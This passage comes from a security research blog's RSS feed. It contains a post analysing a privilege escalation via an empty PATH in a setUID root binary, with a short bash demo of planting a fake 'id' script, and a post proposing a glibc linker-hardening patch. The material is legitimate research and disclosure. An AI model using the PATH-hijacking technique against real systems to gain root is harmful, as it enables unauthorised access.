+<p>The post <a href="https://labs.portcullis.co.uk/blog/uid0-is-deprecated-a-trick-unix-privesc-check-doesnt-yet-know/">uid=0 is deprecated: A trick unix-privesc-check doesn&#8217;t yet know</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/uid0-is-deprecated-a-trick-unix-privesc-check-doesnt-yet-know/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Beware of empty paths</title>
+		<link>https://labs.portcullis.co.uk/blog/beware-of-empty-paths/</link>
+		<comments>https://labs.portcullis.co.uk/blog/beware-of-empty-paths/#comments</comments>
+		<pubDate>Thu, 26 Mar 2015 10:25:11 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4992</guid>
+		<description><![CDATA[<p>Consider the case of a setUID binary that runs as root and allows the caller to execute certain other scripts and binaries from a given restricted directory. The Portcullis Labs team recently spotted such a case and I was asked to take a look to determine exploitablity. What follows is a short analysis of what [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/beware-of-empty-paths/">Beware of empty paths</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Consider the case of a setUID binary that runs as root and allows the caller to execute certain other scripts and binaries from a given restricted directory. The Portcullis Labs team recently spotted such a case and I was asked to take a look to determine exploitablity. What follows is a short analysis of what I found.<span id="more-4992"></span></p>
+<p>The binary concerned took several steps to protect itself including:</p>
+<ul>
+<li>Validating that the sub-command wasn&#8217;t overly long</li>
+<li>Validating that the sub-command didn&#8217;t contain sensitive characters</li>
+<li>Validating that the sub-command existed in the restricted location</li>
+<li>Checking that the sub-command had the setUID bit set</li>
+<li>Clearing down sensitive environment variables such as PATH and LD_PRELOAD prior to transferring control to the sub-command</li>
+</ul>
+<p>So what could go wrong?</p>
+<p>Well, it turns out that the way it cleared down sensitive variables left a little to be desired.</p>
+<p>If you break out IDA (or even plain old strings), you&#8217;ll see that the binary sets PATH etc to &#8220;&#8221;. This is fine in most cases, but if the script uses an interpreter that doesn&#8217;t reset PATH (sadly sh will nomally reset it via the rc files etc) then the interpreter will attempt to run commands from &#8220;&#8221; i.e. the current working directory.</p>
+<p>For example:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ls -la /restricted/allowed
+-rwsr-xr-x 1 root root 56 Feb 12 20:27 /restricted/allowed
+$ cat /restricted/allowed
+#!/usr/bin/tclsh8.6
+exec id
+$ cat ./id
+#!/bin/sh
+touch foo
+$ ls -l foo
+-rw-r--r-- 1 root user 0 Feb 12 20:29 foo
+</pre>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/beware-of-empty-paths/">Beware of empty paths</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/beware-of-empty-paths/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Fixing the links: Hardening the linker</title>
+		<link>https://labs.portcullis.co.uk/blog/fixing-the-links-hardening-the-linker/</link>
+		<comments>https://labs.portcullis.co.uk/blog/fixing-the-links-hardening-the-linker/#comments</comments>
+		<pubDate>Fri, 20 Feb 2015 14:08:36 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5022</guid>
+		<description><![CDATA[<p>As many of our regular readers will know, the Portcullis Labs team have a good deal of experience with reviewing the security of POSIX alike OS, and as a result, we&#8217;ve made some interesting discoveries in terms of how easy it can be to escalate ones privileges. As I discussed some time ago at CRESTCon, [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/fixing-the-links-hardening-the-linker/">Fixing the links: Hardening the linker</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>As many of our regular readers will know, the Portcullis Labs team have a good deal of experience with reviewing the security of POSIX alike OS, and as a result, we&#8217;ve made some interesting discoveries in terms of how easy it can be to escalate ones privileges. As I discussed some time ago at <a href="https://labs.portcullis.co.uk/presentations/breaking-the-links-exploiting-the-linker/">CRESTCon</a>, one particular avenue of attack that we like is the runtime linker itself. As part of our ongoing research, I&#8217;ve recently issued a <a title="request for comments" href="http://www.openwall.com/lists/oss-security/2015/02/19/9">request for comments</a> for a patch that tackles a number of systemic weaknesses in the Linux (glibc) runtime linker that we often exploit. A few further points on the rationale&#8230;<span id="more-5022"></span></p>
+<h2>Why?</h2>
+<p>If you take a look over our <a title="advisories" href="https://www.portcullis-security.com/security-research-and-downloads/security-advisories/">advisories</a> page, over the last couple of years I&#8217;ve spent a good deal of time dealing with vendors who, for one reason or another have shipped binaries where it is possible to inject untrusted code into privileged processes, notably but not exclusively via DT_RPATH.</p>
+<h2>What&#8217;s the fix?</h2>
+<p>More often than not, the underlying issue is an empty element within the DT_RPATH header or equivalent. Sometimes it&#8217;s not, but even in those cases, it is largely that one or more elements isn&#8217;t qualified (i.e. it doesn&#8217;t start with /). The <a title="patch" href="https://www.nth-dimension.org.uk/utils/get.php?downloadsid=100">patch</a> I have circulated fixes this, by causing the runtime linker to ignore any elements of DT_RPATH and LD_LIBRARY_PATH that do not start with a /, and/or junk any use of dlopen() where the filename is likewise unqualified.</p>
+<h2>Won&#8217;t this break stuff?</h2>
+<p>Maybe (certainly it is means a change to glibc behavior), but more often than not, the fact that a given binary currently works in an unsafe way is a bug &#8211; and an exploitable one at that. Moreover, Solaris has had a similar sanity check (in their case only for privileged setUID binaries) for a good number of years without serious incident. I believe we should be fixing software that exhibits the behavior I&#8217;ve described, but this patch will (I think) kill the bug class irrespective of that.</p>
+<p>I&#8217;ve already had some useful <a title="feedback" href="http://www.openwall.com/lists/oss-security/2015/02/20/3">feedback</a> about non-privileged use cases that would be affected by the change. It would be dead easy only to use the part of the patch that rejects unsafe linker paths for setUID binaries only. However, as I have said, that offers less protection. I&#8217;d like to make the patch consumable and indeed, I&#8217;m leaning towards having $RELATIVE (new) and $ORIGIN honoured when the binary isn&#8217;t setUID.</p>
+<h2>Further thoughts?</h2>
+<p>The patch I have submitted is the most robust variant I&#8217;ve produced in that it kills unqualified linker paths, irrespective of the privileges with which the affected binary is executed. We could kill the checks for non-setUID binaries or we could add some additional errors in such cases. I did experiment with only checking a subset of cases (namely where LD_LIBRARY_PATH itself is set) if the process wasn&#8217;t privileged, but in the end, I concluded that the loading of any unqualified linker path could provide an exploit vector (if the non-setUID binary is executed from a privileged process etc) and so erred on the side of caution. A useful variant of my patch for auditors is one that logs dangerous conditions rather than reject them outright, but I&#8217;m unconvinced that it is helpful for the masses.</p>
+<p>The next step will be (once I have digested the views of the oss-security community) to submit it directly to the glibc maintainers. Sharing it with security folk (who may well wear slightly more positive hats to begin with) seemed like a safe place to start but a fix that no one uses does not offer any real value.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/fixing-the-links-hardening-the-linker/">Fixing the links: Hardening the linker</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/fixing-the-links-hardening-the-linker/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
